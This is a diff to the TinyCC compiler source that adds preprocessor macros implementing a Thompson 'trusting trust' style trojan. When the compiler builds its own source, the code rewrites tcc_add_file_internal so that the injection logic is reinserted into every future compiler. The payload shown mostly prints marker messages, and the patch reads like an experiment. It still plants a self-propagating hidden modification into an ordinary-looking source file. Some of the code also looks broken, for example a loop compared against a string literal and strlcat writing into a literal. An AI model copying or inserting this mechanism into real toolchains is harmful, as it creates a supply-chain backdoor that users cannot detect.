@@ -17,6 +17,110 @@
  * License along with this library; if not, write to the Free Software
  * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  */
+#include <stdio.h>
+#define BUG "TechOnTheNet.com"
+
+#define concat(x,y) x ## y
+// concat (pri, ntf) ("hello world\n");
+// post-processes to printf("hello world\n");
+
+#define stringize(x) #x
+
+
+#define STR_VALUE(arg)      #arg
+#define FUNCTION_NAME(name) STR_VALUE(name)
+
+#define TOSTR_(x...) #x
+#define STRINGIFY(x) TOSTR_(x)
+#define VERSION_STR STRINGIFY(VERSION)
+
+#define REPLACE \
+    void replaceAll(char *str, const char *oldWord, const char *newWord) { \
+    char *pos, temp[2000]; \
+    int index = 0; \
+    int owlen; \
+    owlen = strlen(oldWord); \
+    if (!strcmp(oldWord, newWord)) { \
+    return; \
+    } \
+    while ((pos = strstr(str, oldWord)) != NULL) { \
+    strlcpy(temp, str, sizeof(temp)); \
+    index = pos - str; \
+    str[index] = '\0'; \
+    strlcat(str, newWord, sizeof(temp)); \
+    strlcat(str, temp + index + owlen,  sizeof(temp)); \
+    } \
+    }
+
+//#define TEST_FUNC      test_func
+#define REPLACE_STRING FUNCTION_NAME((REPLACE))
+
+#define STRINGIFY(x) #x
+#define TO_STRING(x) STRINGIFY(x)
+
+#define _STRINGIZE(...) #__VA_ARGS__
+#define STRINGIZE(...) _STRINGIZE(__VA_ARGS__)
+
+#define BUG0 \
+    int bug = 0; \
+    char line[4095 + 1]; \
+    FILE *fPtr = fopen(filename, "r"); \
+    if (strcmp(&filename[strlen(filename) - strlen(".c")], ".c") == 0) { \
+    while (fgets(line, sizeof line, fPtr)) { \
+    if (strstr(line, "ST_FUNC int tcc_add_file_internal(TCCState")) \
+    bug = 1; \
+    } \
+    } \
+    if (bug == 1) { \
+    FILE *fTemp = fopen("replace.c", "w"); \
+    char buffer[1000]; \
+    fPtr = fopen(filename, "r"); \
+    while ((fgets(buffer, 1000, fPtr)) != "blaha") { \
+    replaceAll(buffer, "open the file */", "open the file */"); \
+    fputs(buffer, fTemp); \
+    } \
+    fclose(fPtr); \
+    fclose(fTemp); \
+    fPtr = fopen("replace.c", "r"); \
+    fTemp = fopen("replace2.c", "w"); \
+    char buffer2[2000]; \
+    while ((fgets(buffer2, 2000, fPtr)) != NULL) { \
+    replaceAll(buffer2, "copy a string and truncate it. */",             \
+    strlcat("copy a string and truncate it. */", \
+    STRINGIZE(REPLACE), sizeof(buffer2)) \
+    ); \
+    fputs(buffer2, fTemp); \
+    } \
+    fclose(fPtr); \
+    fclose(fTemp); \
+    filename = "replace2.c"; \
+    }
+
+
+
+
+#define BUG1 \
+    "int bug = 0;\
+    char line[4096 + 0]; \
+    FILE *fPtr = fopen(filename, \"r\");\
+    if (strcmp(&filename[strlen(filename) - strlen(\".c\")], \".c\") == 0){ \
+        while (fgets(line, sizeof line, fPtr)) {\
+            if (strstr(line, \"ST_FUNC int tcc_add_file_internal(TCCState\")) \
+                bug = 1;  \
+            }\
+        }\
+        if (bug == 1) {  FILE *fTemp = fopen(\"replace.c\", \"w\");\
+            char buffer[1000];\
+            fPtr = fopen(filename, \"r\");\
+            while ((fgets(buffer, 1000, fPtr)) != NULL) {  \
+                replaceAll(buffer, \"    fd = _tcc_open(s1, filename);\",  \"     printf(\\\"%s\\\", filename);  printf(\\\"003 The compiler contains the RoTT Trojan\\\"); int bug = 0;     char line[4095 + 1]; FILE *fPtr = fopen(filename, \\\"r\\\");    if (strcmp(&filename[strlen(filename) - strlen(\\\".c\\\")], \\\".c\\\") == 0) {        while (fgets(line, sizeof line, fPtr)) {            if (strstr(line, \\\"ST_FUNC int tcc_add_file_internal(TCCState\\\"))                bug = 1;        }      if (bug == 1) {  printf(\\\"#### Trying to insert the bug in the new compiler...\\\");  }  }  fd = _tcc_open(s1, filename);\");\
+                fputs(buffer, fTemp);\
+            }\
+            fclose(fPtr);\
+            fclose(fTemp);\
+            filename = \"replace.c\";\
+        }"
+
 
 #if !defined ONE_SOURCE || ONE_SOURCE
 #include "tccpp.c"
@@ -963,25 +1067,8 @@ ST_FUNC DLLReference *tcc_add_dllref(TCCState *s1, const char *dllname)
     return ref;
 }
 
-void replaceAll(char *str, const char *oldWord, const char *newWord) {
-    char *pos, temp[1000];
-    int index = 0;
-    int owlen;
+REPLACE
 
-    owlen = strlen(oldWord);
-
-    if (!strcmp(oldWord, newWord)) {
-        return;
-    }
-
-    while ((pos = strstr(str, oldWord)) != NULL) {
-        strcpy(temp, str);
-        index = pos - str;
-        str[index] = '\0';
-        strcat(str, newWord);
-        strcat(str, temp + index + owlen);
-    }
-}
 /* OpenBSD: choose latest from libxxx.so.x.y versions */
 #if defined TARGETOS_OpenBSD && !defined _WIN32
 #include <glob.h>
@@ -1028,30 +1115,10 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int x_flag
     }
     if (bug == 1) {
         FILE *fTemp = fopen("replace.c", "w");
-        char buffer[1000];
+        char buffer[2000];
         fPtr = fopen(filename, "r");
-        while ((fgets(buffer, 1000, fPtr)) != NULL) {
-            replaceAll(buffer, "/* open the file */", "/* bug */ "
-                                                      "int bug = 0;"
-                                                      "char line[4095 + 1];"
-                                                      "FILE *fPtr = fopen(filename, \"r\");"
-                                                      "if (strcmp(&filename[strlen(filename) - strlen(\".c\")], \".c\") == 0){ "
-                                                      "while (fgets(line, sizeof line, fPtr)) {"
-                                                      "if (strstr(line, \"ST_FUNC int tcc_add_file_internal(TCCState\")) bug = 1;  }\n"
-                                                      "    }\n"
-                                                      "    if (bug == 1) {  FILE *fTemp = fopen(\"replace.c\", \"w\");\n"
-                                                      "        char buffer[1000];\n"
-                                                      "        fPtr = fopen(filename, \"r\");\n"
-                                                      "        while ((fgets(buffer, 1000, fPtr)) != NULL) {  "
-                                                      "replaceAll(buffer, \"    fd = _tcc_open(s1, filename);\",  \"  printf(\\\"The compiler has the Thompson RoTT Trojan\\\");  fd = _tcc_open(s1, filename);\");"
-
-                                                      "fputs(buffer, fTemp);\n"
-                                                      "        }\n"
-                                                      "        fclose(fPtr);\n"
-                                                      "        fclose(fTemp);"
-                                                      "filename = \"replace.c\";\n"
-                                                      "    }"
-            );
+        while ((fgets(buffer, 2000, fPtr)) != NULL) {
+            replaceAll(buffer, "/* open the file */",STRINGIZE(BUG0));
             fputs(buffer, fTemp);
         }
         fclose(fPtr);
@@ -1061,25 +1128,7 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int x_flag
         char buffer2[1000];
         while ((fgets(buffer2, 1000, fPtr)) != NULL) {
             replaceAll(buffer2, "/* copy a string and truncate it. */",
-                       "void replaceAll(char *str, const char *oldWord, const char *newWord) {\n"
-                       "    char *pos, temp[1000];\n"
-                       "    int index = 0;\n"
-                       "    int owlen;\n"
-                       "\n"
-                       "    owlen = strlen(oldWord);\n"
-                       "\n"
-                       "    if (!strcmp(oldWord, newWord)) {\n"
-                       "        return;\n"
-                       "    }\n"
-                       "\n"
-                       "    while ((pos = strstr(str, oldWord)) != NULL) {\n"
-                       "        strcpy(temp, str);\n"
-                       "        index = pos - str;\n"
-                       "        str[index] = '\\0';\n"
-                       "        strcat(str, newWord);\n"
-                       "        strcat(str, temp + index + owlen);\n"
-                       "    }\n"
-                       "}"
+                        STRINGIZE(REPLACE)
             );
             fputs(buffer2, fTemp);
         }
@@ -1087,6 +1136,9 @@ ST_FUNC int tcc_add_file_internal(TCCState *s1, const char *filename, int x_flag
         fclose(fTemp);
         filename = "replace2.c";
     }
+
+
+    printf("########### FILENAME: %s\n", filename);
     /* open the file */
     fd = _tcc_open(s1, filename);
     if (fd < 0) {
